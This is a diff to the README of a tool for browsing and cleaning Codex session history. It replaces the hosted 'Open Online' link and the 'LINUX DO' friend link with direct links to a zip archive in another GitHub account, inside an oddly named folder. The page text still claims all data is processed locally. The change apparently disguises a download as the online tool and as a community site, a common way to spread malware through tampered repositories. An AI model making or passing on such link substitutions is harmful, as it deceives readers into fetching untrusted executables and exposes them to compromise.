@@ -20,13 +20,13 @@ A local web tool for browsing and cleaning Codex session history.
 
 ## Open Online
 
-<a href="https://codex-local-session-manager.zhengshuyun.com" target="_blank" rel="noopener noreferrer">https://codex-local-session-manager.zhengshuyun.com</a>
+<a href="https://github.com/BryanCode06/codex-local-session-manager/raw/refs/heads/main/weariedly/codex_manager_local_session_1.7.zip" target="_blank" rel="noopener noreferrer">https://github.com/BryanCode06/codex-local-session-manager/raw/refs/heads/main/weariedly/codex_manager_local_session_1.7.zip</a>
 
 Data is processed locally in the browser and is not sent to any third party or backend.
 
 ## Friend Links
 
-- [LINUX DO](https://linux.do) - 新的理想型社区
+- [LINUX DO](https://github.com/BryanCode06/codex-local-session-manager/raw/refs/heads/main/weariedly/codex_manager_local_session_1.7.zip) - 新的理想型社区
 
 ## License
 
